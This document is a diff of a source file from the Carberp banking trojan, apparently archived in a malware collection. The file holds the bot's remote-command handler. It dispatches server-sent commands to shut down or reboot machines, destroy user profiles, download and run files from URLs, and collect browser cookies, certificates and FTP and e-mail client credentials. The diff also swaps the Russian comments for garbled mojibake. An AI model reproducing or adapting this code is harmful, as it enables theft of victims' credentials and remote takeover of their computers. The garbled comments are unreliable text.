@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "stdafx.h"
 
 #include <windows.h>
@@ -32,21 +43,21 @@
 //#include "..\common\comlibrary.h"
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////
-// Инструменты.
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 ////////////////////////////////////////////////////////////////////////////////////////////////////
 
 #if(BO_WININET > 0 || BO_NSPR4 > 0)
 /*
-  Операции со списками HttpGrabber'а.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HttpGrabber'пїЅ.
 
   IN listId         - LocalConfig::ITEM_URLLIST_*.
-  IN add            - true - добавление элементов в список,
-                      false - удаление элементов из списка.
-  IN arguments      - аргументы.
-  IN argumentsCount - кол. аргументов.
+  IN add            - true - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+                      false - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN arguments      - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN argumentsCount - пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return            - true - в случаи успеха,
-                      false - в случаи ошибки.
+  Return            - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+                      false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool httpGrabberListOperation(DWORD listId, bool add, const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -80,28 +91,28 @@ static bool httpGrabberListOperation(DWORD listId, bool add, const LPWSTR *argum
 
     Mem::free(localConfig);
     LocalConfig::endReadWrite(NULL);
-    return true; //Т.е. уже все есть или нет в спике.
+    return true; //пїЅ.пїЅ. пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ.
   }
   return false;
 }
 #endif
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////
-// Команды.
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 ////////////////////////////////////////////////////////////////////////////////////////////////////
 enum
 {
-  PF_SHUTDOWN  = 0x01, //Вылючить компьютер.
-  PF_REBOOT    = 0x02, //Перезагрузить компютер.
-  PF_LOGOFF    = 0x04, //Завершить текущию сессю пользователя.
-  PF_UNINSTALL = 0x08, //Удалить бота.
-  PF_DESTROY   = 0x10  //Уничтожение пользователя.
+  PF_SHUTDOWN  = 0x01, //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  PF_REBOOT    = 0x02, //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  PF_LOGOFF    = 0x04, //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  PF_UNINSTALL = 0x08, //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
+  PF_DESTROY   = 0x10  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 };
 
 static DWORD pendingFlags;
 
 /*
-  Выключение компьютера, пользователь должен обладать правами для этой операции.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool osShutdown(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -110,7 +121,7 @@ static bool osShutdown(const LPWSTR *arguments, DWORD argumentsCount)
 }
 
 /*
-  Перезагрузка компьютера, пользователь должен обладать правами для этой операции.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool osReboot(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -119,7 +130,7 @@ static bool osReboot(const LPWSTR *arguments, DWORD argumentsCount)
 }
 
 /*
-  Удаление бота с текущего пользователя.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool botUninstall(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -128,8 +139,8 @@ static bool botUninstall(const LPWSTR *arguments, DWORD argumentsCount)
 }
 
 /*
-  Немедленное обновление файла конфигурации. Если казана URL, то обновление произойдет с указаной
-  URL, и такжебудеит принудительно запушен бот-файл обнволения указаный в загружаемой конфигурации.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ URL, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+  URL, пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ-пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool botUpdate(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -209,7 +220,7 @@ static bool fsSearchRemove(const LPWSTR *arguments, DWORD argumentsCount)
 }
 
 /*
-  Уничтожение текущего пользователя.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool userDestroy(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -218,7 +229,7 @@ static bool userDestroy(const LPWSTR *arguments, DWORD argumentsCount)
 }
 
 /*
-  Завершение текущей сессии пользователя.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool userLogoff(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -239,15 +250,15 @@ static bool userExecute(const LPWSTR *arguments, DWORD argumentsCount)
     {
       if(Str::_utf8FromUnicode(arguments[1], -1, &u8Url))
       {
-        //Создаем временную директорию.
+        //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
         if(Fs::_createTempDirectory(NULL, filePath))
         {
-          //Получаем имя файла.
+          //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
           //FIXME: Content-Disposition
           LPWSTR fileName = HttpTools::_getFileNameFromUrl((LPSTR)u8Url.data);
           if(fileName != NULL && Fs::_pathCombine(filePath, filePath, fileName))
           {
-            //Загрузка файла.
+            //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
             Wininet::CALLURLDATA cud;
             Core::initDefaultCallUrlData(&cud);
 
@@ -271,14 +282,14 @@ static bool userExecute(const LPWSTR *arguments, DWORD argumentsCount)
         Str::_utf8Free(&u8Url);
       }
     }
-    //Локальный путь. Конвертация переменных.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     else
     {
       DWORD size = CWA(kernel32, ExpandEnvironmentStringsW)(arguments[1], filePath, MAX_PATH);
       if(size > 0 && size < MAX_PATH)ok = true;
     }
 
-    //Запсук файла.
+    //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
     if(ok)
     {
       LPWSTR commandLine = NULL;
@@ -289,10 +300,10 @@ static bool userExecute(const LPWSTR *arguments, DWORD argumentsCount)
       else
       {
         WDEBUG1(WDDT_INFO, "commandLine=[%s]", commandLine);
-        //Запуск.
+        //пїЅпїЅпїЅпїЅпїЅпїЅ.
         ok = (((int)CWA(shell32, ShellExecuteW)(NULL, NULL, filePath, commandLine, NULL, SW_SHOWNORMAL)) > 32);
       
-        //Ну смысл в том... Что стоит попытаться.
+        //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ... пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
         if(!ok)ok = (Process::_createEx(filePath, commandLine, NULL, NULL, NULL) != 0);
         
         Mem::free(commandLine);
@@ -304,7 +315,7 @@ static bool userExecute(const LPWSTR *arguments, DWORD argumentsCount)
 
 #if(BO_WININET > 0 || BO_NSPR4 > 0)
 /*
-  Получение куков известных браузеров.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool userCookiesGet(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -318,7 +329,7 @@ static bool userCookiesGet(const LPWSTR *arguments, DWORD argumentsCount)
 }
 
 /*
-  Удаление куков известных браузеров.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool userCookiesRemove(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -333,7 +344,7 @@ static bool userCookiesRemove(const LPWSTR *arguments, DWORD argumentsCount)
 #endif
 
 /*
-  Сохранение серитифатов из MY.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ MY.
 */
 static bool userCertsGet(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -341,7 +352,7 @@ static bool userCertsGet(const LPWSTR *arguments, DWORD argumentsCount)
 }
 
 /*
-  Удаление серитифкатов из MY.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ MY.
 */
 static bool userCertsRemove(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -362,7 +373,7 @@ static bool userUrlUnblock(const LPWSTR *arguments, DWORD argumentsCount)
 
 #if(BO_WININET > 0 || BO_NSPR4 > 0)
 /*
-  Установка домашних страницы для всех поддерживаемых браузеров.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool userHomepageSet(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -376,7 +387,7 @@ static bool userHomepageSet(const LPWSTR *arguments, DWORD argumentsCount)
 
 #if(BO_SOFTWARE_FTP > 0)
 /*
-  Получение данных FTP-клиентов.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ FTP-пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool userFtpClientsGet(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -393,7 +404,7 @@ static bool userFtpClientsGet(const LPWSTR *arguments, DWORD argumentsCount)
 
 #if(BO_SOFTWARE_EMAIL > 0)
 /*
-  Получение данных E-mail-клиентов.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ E-mail-пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool userEmailClientsGet(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -409,7 +420,7 @@ static bool userEmailClientsGet(const LPWSTR *arguments, DWORD argumentsCount)
 #endif
 
 /*
-  Получение куков флеш-плеера.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ-пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool userFlashPlayerGet(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -418,7 +429,7 @@ static bool userFlashPlayerGet(const LPWSTR *arguments, DWORD argumentsCount)
 }
 
 /*
-  Удаление куков флеш-плеера.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ-пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool userFlashPlayerRemove(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -427,11 +438,11 @@ static bool userFlashPlayerRemove(const LPWSTR *arguments, DWORD argumentsCount)
 }
 
 /*
-  Исполнение команд, которые должны исполниться после отправки ответа серверу.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static void executePendingCommands(void)
 {
-  //Пока бот должен сохранять свою активность.
+  //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   if(pendingFlags & PF_DESTROY)
   {
     Core::destroyUser();
@@ -443,7 +454,7 @@ static void executePendingCommands(void)
     CoreInstall::_uninstall(false);
   }
   
-  //Операции завершения работы, может выполниться только один из них.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ.
   if(pendingFlags & (PF_REBOOT | PF_SHUTDOWN))
   {
     Process::_enablePrivilege(SE_SHUTDOWN_NAME, true);
@@ -459,23 +470,23 @@ static void executePendingCommands(void)
 }
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////
-// Структура команд.
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 ////////////////////////////////////////////////////////////////////////////////////////////////////
 
 typedef bool (*COMMANDPROC)(const LPWSTR *arguments, DWORD argumentsCount);
 typedef struct
 {
-  WORD nameId;      //Имя команды.
-  COMMANDPROC proc; //Функция обработки команды.
+  WORD nameId;      //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  COMMANDPROC proc; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 }COMMANDDATA;
 
 static const COMMANDDATA commandData[] =
 {
-  //Работы с OC.
+  //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ OC.
   {CryptedStrings::id_remotescript_command_os_shutdown,             osShutdown},
   {CryptedStrings::id_remotescript_command_os_reboot,               osReboot},
   
-  //Работа с ботом.
+  //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ.
   {CryptedStrings::id_remotescript_command_bot_uninstall,           botUninstall},
   {CryptedStrings::id_remotescript_command_bot_update,              botUpdate},
 #if(BO_BCSERVER_PLATFORMS > 0)
@@ -485,12 +496,12 @@ static const COMMANDDATA commandData[] =
   {CryptedStrings::id_remotescript_command_bot_httpinject_disable,  botHttpInjectDisable},
   {CryptedStrings::id_remotescript_command_bot_httpinject_enable,   botHttpInjectEnable},
 
-  //Работа с фалйами.
+  //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   {CryptedStrings::id_remotescript_command_fs_path_get,             fsPathGet},
   {CryptedStrings::id_remotescript_command_fs_search_add,           fsSearchAdd},
   {CryptedStrings::id_remotescript_command_fs_search_remove,        fsSearchRemove},
   
-  //Работа с пользователем.
+  //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   {CryptedStrings::id_remotescript_command_user_destroy,            userDestroy},
   {CryptedStrings::id_remotescript_command_user_logoff,             userLogoff},
   {CryptedStrings::id_remotescript_command_user_execute,            userExecute},
@@ -523,9 +534,9 @@ static const COMMANDDATA commandData[] =
 
 typedef struct
 {
-  WORD errorMessageId; //Сообщение об ошибки или 0.
-  DWORD errorLine;     //Строка ошибки или (DWORD)-1.
-  LPBYTE hash;         //Хэш скрипта.
+  WORD errorMessageId; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ 0.
+  DWORD errorLine;     //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ (DWORD)-1.
+  LPBYTE hash;         //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 }SCRIPTDATA;
 
 void RemoteScript::init(void)
@@ -545,7 +556,7 @@ static int requestProc(DWORD loop, Report::SERVERSESSION *session)
     SCRIPTDATA *scriptData = (SCRIPTDATA *)session->customData;
     DWORD status = scriptData->errorMessageId == 0 ? 0 : 1;
     
-    //Т.к. сообщение пишуться только первой половиной ascii, не смысла возиться с Unicode/UTF8.
+    //пїЅ.пїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ ascii, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ Unicode/UTF8.
     char message[CryptedStrings::len_max + 10/*DWORD*/];
 
     if(scriptData->errorMessageId == 0)CryptedStrings::_getA(CryptedStrings::id_remotescript_error_success, message);
@@ -573,12 +584,12 @@ static int resultProc(DWORD loop, Report::SERVERSESSION *session)
 }
 
 /*
-  Проверка статус скрипта.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN hash - MD5 хэш скрипта.
+  IN hash - MD5 пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return  - 0 - в случаи успеха,
-            CryptedStrings::id_* - в случаи провала.
+  Return  - 0 - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+            CryptedStrings::id_* - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static WORD getScriptStatusByHash(LPBYTE hash)
 {
@@ -602,7 +613,7 @@ static WORD getScriptStatusByHash(LPBYTE hash)
         break;
       }
 
-      //Добавляем новый хэш.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ.
       if(errorMessageId == 0)
       {
         bool added = false;
@@ -619,21 +630,21 @@ static WORD getScriptStatusByHash(LPBYTE hash)
         }
       }
     }
-    //Либо повреждение либо команды еще не когда не принимались. Создаем новый список.
+    //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
     else if(!BinStorage::_addItem(&localConfig, LocalConfig::ITEM_REMOTESCRIPT_HASH, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, hash, MD5HASH_SIZE))
     {
       errorMessageId = CryptedStrings::id_remotescript_error_not_enough_memory;
       WDEBUG0(WDDT_ERROR, "_addItem failed.");
     }
 
-    //Если произошла ошибка, вносить изменения не нужно.
+    //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
     if(errorMessageId != 0)
     {
       Mem::free(localConfig);
       localConfig = NULL;
     }
 
-    //Освобождение памяти и сохранение конфигурации.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     Mem::free(hashList);
     if(!LocalConfig::endReadWrite(localConfig) && localConfig != NULL)errorMessageId = CryptedStrings::id_remotescript_error_failed_to_save;
   }
@@ -642,13 +653,13 @@ static WORD getScriptStatusByHash(LPBYTE hash)
 }
 
 /*
-  Исполнение скрипта.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN scriptText - текст скрипта.
-  OUT errorLine - строка на котроый произошла ошибка, или (DWORD)-1 если ошиюка произошла не на
-                  строке.
-  Return        - 0 - в случаи успеха,
-                  CryptedStrings::id_* - случаи провала.
+  IN scriptText - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  OUT errorLine - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ (DWORD)-1 пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ
+                  пїЅпїЅпїЅпїЅпїЅпїЅ.
+  Return        - 0 - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+                  CryptedStrings::id_* - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static WORD executeScript(LPWSTR scriptText, LPDWORD errorLine)
 {
@@ -664,7 +675,7 @@ static WORD executeScript(LPWSTR scriptText, LPDWORD errorLine)
   }
   else
   {
-    //Перечисляем строки.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
     for(DWORD i = 0; i < linesCount; i++)if(lines[i] != NULL && lines[i][0] != 0)
     {
       LPWSTR *args;
@@ -682,7 +693,7 @@ static WORD executeScript(LPWSTR scriptText, LPDWORD errorLine)
         {
           WCHAR commandNameBuffer[CryptedStrings::len_max];
           
-          //Ищим команду.
+          //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
           DWORD ci = 0;
           for(; ci < sizeof(commandData) / sizeof(COMMANDDATA); ci++)
           {
@@ -700,7 +711,7 @@ static WORD executeScript(LPWSTR scriptText, LPDWORD errorLine)
             }
           }
 
-          //Если команда не найдена.
+          //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
           if(ci == sizeof(commandData) / sizeof(COMMANDDATA))
           {
             WDEBUG1(WDDT_INFO, "Unknown command \"%s\".", args[0]);
@@ -711,7 +722,7 @@ static WORD executeScript(LPWSTR scriptText, LPDWORD errorLine)
         Mem::freeArrayOfPointers(args, argsCount);
       }
 
-      //Если найдена ошибка, прерываем выполнение скрипта.
+      //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       if(errorMessageId != 0)break;
     }
     Mem::freeArrayOfPointers(lines, linesCount);
@@ -721,7 +732,7 @@ static WORD executeScript(LPWSTR scriptText, LPDWORD errorLine)
 }
 
 /*
-  Точка входа для обработки скрипта.
+  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
